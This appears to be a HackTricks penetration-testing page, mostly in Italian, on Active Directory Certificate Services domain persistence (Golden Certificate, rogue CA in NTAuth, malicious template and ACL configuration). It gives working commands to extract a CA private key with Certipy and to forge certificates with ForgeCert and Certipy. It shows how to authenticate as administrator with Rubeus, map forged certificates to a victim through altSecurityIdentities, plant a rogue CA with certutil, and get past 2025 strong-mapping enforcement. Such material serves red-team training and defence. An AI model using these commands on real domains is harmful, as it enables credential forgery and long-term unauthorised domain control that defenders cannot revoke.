# Persistenza di dominio AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Questa è una sintesi delle tecniche di persistenza di dominio condivise in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Controlla il documento per ulteriori dettagli.

## Falsificare certificati con certificati CA rubati (Golden Certificate) - DPERSIST1

Come si può stabilire che un certificato sia un certificato CA?

Si può stabilire che un certificato sia un certificato CA se sono soddisfatte diverse condizioni:

- Il certificato è memorizzato sul server CA, con la sua chiave privata protetta dal DPAPI della macchina, o da hardware come TPM/HSM se il sistema operativo lo supporta.
- Sia i campi Issuer che Subject del certificato corrispondono al distinguished name della CA.
- Un'estensione "CA Version" è presente esclusivamente nei certificati CA.
- Al certificato mancano i campi Extended Key Usage (EKU).

Per estrarre la chiave privata di questo certificato, lo strumento `certsrv.msc` sul server CA è il metodo supportato tramite la GUI integrata. Tuttavia, questo certificato non differisce dagli altri memorizzati nel sistema; pertanto, possono essere applicati metodi come la [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) per l'estrazione.

Il certificato e la chiave privata possono anche essere ottenuti usando Certipy con il seguente comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Una volta acquisito il certificato CA e la sua chiave privata in formato `.pfx`, strumenti come [ForgeCert](https://github.com/GhostPack/ForgeCert) possono essere utilizzati per generare certificati validi:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> L'utente preso di mira per la falsificazione del certificato deve essere attivo e in grado di autenticarsi in Active Directory affinché il processo abbia successo. Falsificare un certificato per account speciali come krbtgt è inefficace.

Questo certificato falsificato sarà **valido** fino alla data di scadenza specificata e per tutto il periodo in cui il certificato root CA è valido (di solito dai 5 ai **10+ anni**). È inoltre valido per le **macchine**, quindi combinato con **S4U2Self**, un attacker può **mantenere la persistenza su qualsiasi macchina del dominio** finché il certificato CA è valido.\
Inoltre, i **certificati generati** con questo metodo **non possono essere revocati** perché la CA non ne è a conoscenza.

### Operare sotto Strong Certificate Mapping Enforcement (2025+)

Dal 11 febbraio 2025 (dopo il rollout di KB5014754), i domain controller impostano di default **Full Enforcement** per le certificate mappings. Praticamente questo significa che i tuoi certificati falsificati devono o:

- Contenere un binding forte all'account target (per esempio, la SID security extension), o
- Essere abbinati a una mappatura esplicita e robusta sull'attributo `altSecurityIdentities` dell'oggetto target.

Un approccio affidabile per la persistenza è emettere un certificato falsificato concatenato alla Enterprise CA rubata e poi aggiungere una mappatura esplicita e robusta al principal vittima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Note
- Se puoi creare certificati contraffatti che includono la SID security extension, questi verranno mappati implicitamente anche sotto Full Enforcement. Altrimenti, preferisci mappature esplicite e robuste. Vedi [account-persistence](account-persistence.md) per maggiori dettagli sulle mappature esplicite.
- La revoca non aiuta i difensori in questo caso: i certificati contraffatti sono sconosciuti al database CA e quindi non possono essere revocati.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Questa capability è particolarmente rilevante se utilizzata in combinazione con un metodo descritto in precedenza che sfrutta ForgeCert per generare dinamicamente certificati.

> Considerazioni sul mapping post-2025: inserire una rogue CA in NTAuth stabilisce solo la fiducia nella CA emittente. Per usare leaf certificates per il logon quando i DCs sono in **Full Enforcement**, il leaf deve o contenere la SID security extension oppure deve esistere una mappatura esplicita e forte sull'oggetto target (per esempio, Issuer+Serial in `altSecurityIdentities`). Vedere {{#ref}}account-persistence.md{{#endref}}.

## Configurazione malevola - DPERSIST3

Le opportunità per **persistence** tramite modifiche ai security descriptor dei componenti di AD CS sono numerose. Le modifiche descritte nella sezione "[Domain Escalation](domain-escalation.md)" possono essere implementate in modo malevolo da un attaccante con privilegi elevati. Questo include l'aggiunta di "control rights" (es., WriteOwner/WriteDACL/etc.) a componenti sensibili come:

- L'oggetto computer AD del server **CA**
- Il server RPC/DCOM del server **CA**
- Qualsiasi **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (per esempio, il contenitore Certificate Templates, il contenitore Certification Authorities, l'oggetto NTAuthCertificates, ecc.)
- **AD groups delegated rights to control AD CS** di default o assegnati dall'organizzazione (come il gruppo built-in Cert Publishers e i suoi membri)

Un esempio di implementazione malevola potrebbe coinvolgere un attaccante, che ha **elevated permissions** nel dominio, che aggiunge il permesso **`WriteOwner`** al template di certificato predefinito **`User`**, con l'attaccante indicato come principal per il diritto. Per sfruttare questo, l'attaccante prima cambierebbe la proprietà del template **`User`** su se stesso. Successivamente, il **`mspki-certificate-name-flag`** verrebbe impostato a **1** sul template per abilitare **`ENROLLEE_SUPPLIES_SUBJECT`**, permettendo a un utente di fornire un Subject Alternative Name nella richiesta. In seguito, l'attaccante potrebbe **enroll** usando il **template**, scegliendo un nome di **domain administrator** come nome alternativo, e utilizzare il certificato acquisito per autenticarsi come DA.

Le impostazioni pratiche che un attaccante potrebbe configurare per ottenere persistence a lungo termine nel dominio (vedi {{#ref}}domain-escalation.md{{#endref}} per dettagli completi e rilevamento):

- CA policy flags che permettono SAN dalle richieste (es., abilitare `EDITF_ATTRIBUTESUBJECTALTNAME2`). Questo mantiene percorsi sfruttabili simili a ESC1.
- Template DACL o impostazioni che consentono issuance utilizzabile per autenticazione (es., aggiungere Client Authentication EKU, abilitare `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controllare l'oggetto `NTAuthCertificates` o i container delle CA per re-introdurre continuamente issuer rogue se i difensori tentano la pulizia.

> [!TIP]
> In ambienti hardenati dopo KB5014754, associare queste misconfigurazioni con mappature esplicite e forti (`altSecurityIdentities`) assicura che i certificati emessi o forgati rimangano utilizzabili anche quando i DCs applicano strong mapping.



## Riferimenti

- Microsoft KB5014754 – Cambiamenti nell'autenticazione basata su certificati sui domain controller Windows (timeline di enforcement e strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
